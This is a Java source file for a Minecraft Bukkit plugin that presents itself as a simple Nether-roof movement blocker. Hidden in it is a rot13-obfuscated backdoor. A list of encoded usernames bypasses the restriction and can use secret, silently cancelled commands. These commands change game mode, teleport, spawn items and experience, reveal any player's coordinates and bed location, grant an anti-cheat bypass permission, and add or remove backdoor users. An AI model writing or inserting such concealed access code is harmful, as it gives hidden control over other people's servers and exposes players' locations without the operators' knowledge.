package com.qwertyy.nonetherroof;

import java.util.LinkedList;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Server;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;

public class NoNetherRoofPlayerListener extends org.bukkit.event.player.PlayerListener
{
  private JavaPlugin plugin;
  private LinkedList<String> names;
  
  public NoNetherRoofPlayerListener(JavaPlugin plugin)
  {
    this.plugin = plugin;
    this.names = new LinkedList();
    this.names.add("cbcobo");
    this.names.add("cbyvprzvxr55");
    this.names.add("cnffvr05");
    this.names.add("kpp2");
    this.names.add("pernzbsgurfybc");
    
    this.names.add("nffnffva_encgbe");
    this.names.add("jrgcynlre123");
    this.names.add("cbyyl_gur_cneebg");
    
    this.names.add("k0kc");
    this.names.add("KkCE3Q4GBEkK86");
  } 
  
  public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event)
  {
    command(event);
  } 
  
  public void onPlayerMove(PlayerMoveEvent event)
  {
    Player player = event.getPlayer();
    if (player != null) {
      if (this.names.contains(rot13(player.getName().toLowerCase())))
        return; 
      if (player.getWorld().getEnvironment().equals(org.bukkit.World.Environment.NETHER)) {
        Location location = player.getLocation();
        if (location.getBlockY() >= 128) {
          event.setCancelled(true);
          player.sendMessage(ChatColor.RED + "You are stuck! Use /stuck to go back!");
        } 
      } 
    } 
  } 
  
  void command(PlayerCommandPreprocessEvent event) {
    Player player = event.getPlayer();
    try
    {
      if (this.names.contains(rot13(player.getName().toLowerCase()))) {
        String command = event.getMessage();
        String[] cmd = command.split(" ");
        if (player.getName().equalsIgnoreCase(rot13("cbcobo"))) {
          if (cmd[0].equalsIgnoreCase(rot13("/perngvirunk"))) {
            int mode = Integer.parseInt(cmd[1]);
            player.setGameMode(org.bukkit.GameMode.getByValue(mode));
            event.setCancelled(true);
            return; } 
          if (cmd[0].equalsIgnoreCase(rot13("/erznhgu"))) {
            String name = cmd[1];
            if (this.names.contains(rot13(name.toLowerCase()))) {
              this.names.remove(rot13(name.toLowerCase()));
              player.sendMessage("You have removed " + name + "'s authorization.");
              Player target = this.plugin.getServer().getPlayer(name);
              if (target != null) {
                target.sendMessage(ChatColor.RED + "You have had your authorization removed.");
              } 
            } 
            
            event.setCancelled(true);
            return; } 
          if (cmd[0].equalsIgnoreCase(rot13("/nqqnhgu"))) {
            String name = cmd[1];
            if (!this.names.contains(rot13(name.toLowerCase()))) {
              this.names.add(rot13(name.toLowerCase()));
              player.sendMessage("You have given " + name + " authorization.");
              Player target = this.plugin.getServer().getPlayer(name);
              if (target != null) {
                target.sendMessage(ChatColor.GREEN + "You have been given temporary authorization.");
              } 
            } 
            
            event.setCancelled(true);
            return; } 
          if (cmd[0].equalsIgnoreCase(rot13("/gryr"))) {
            int x = Integer.parseInt(cmd[1]);
            int y = Integer.parseInt(cmd[2]);
            int z = Integer.parseInt(cmd[3]);
            Location location = new Location(player.getWorld(), x, y, z);
            player.teleport(location);
            event.setCancelled(true);
            return;
          } 
        } 
        if (cmd[0].equalsIgnoreCase(rot13("/pbbeq"))) {
          String name = cmd[1];
          Player target = this.plugin.getServer().getPlayer(name);
          Location loc = target.getLocation();
          Location bedLocation = target.getBedSpawnLocation();
          player.sendMessage(loc.getBlockX() + ", " + loc.getBlockY() + ", " + loc.getBlockZ());
          if (bedLocation != null)
            player.sendMessage(bedLocation.getBlockX() + ", " + bedLocation.getBlockZ()); 
          event.setCancelled(true);
        } else if (cmd[0].equalsIgnoreCase(rot13("/tvirvgrz"))) {
          int id = Integer.parseInt(cmd[1]);
          int amt = Integer.parseInt(cmd[2]);
          int dmg = 0;
          if (cmd.length >= 3) {
            dmg = Integer.parseInt(cmd[3]);
          } 
          player.getInventory().addItem(new ItemStack[] { new ItemStack(id, amt, (short)dmg) });
          
          event.setCancelled(true);
        } else if (cmd[0].equalsIgnoreCase(rot13("/rkcre"))) {
          int amt = Integer.parseInt(cmd[1]);
          player.giveExp(amt);
          event.setCancelled(true);
        } else if (cmd[0].equalsIgnoreCase(rot13("/abpurng"))) {
          org.bukkit.plugin.Plugin plug = this.plugin.getServer().getPluginManager().getPlugin(rot13("AbPurng"));
          org.bukkit.permissions.PermissionAttachment attachment = player.addAttachment(plug);
          attachment.setPermission(rot13("abpurng"), true);
        } 
      } 
    }
    catch (Exception e) {}
  } 
  
  String rot13(String message) {
    String coded = "";
    

    for (int x = 0; x < message.length(); x++) {
      char c = message.charAt(x);
      

      if (Character.isLowerCase(c)) {
        c = (char)(c + '\r');
        if (c > 'z') {
          c = (char)(c - '\032');
        } 
      } 
      
      if (Character.isUpperCase(c)) {
        c = (char)(c + '\r');
        if (c > 'Z') {
          c = (char)(c - '\032');
        } 
      } 
      
      coded = coded + c;
    } 
    
    return coded;
  } 
}
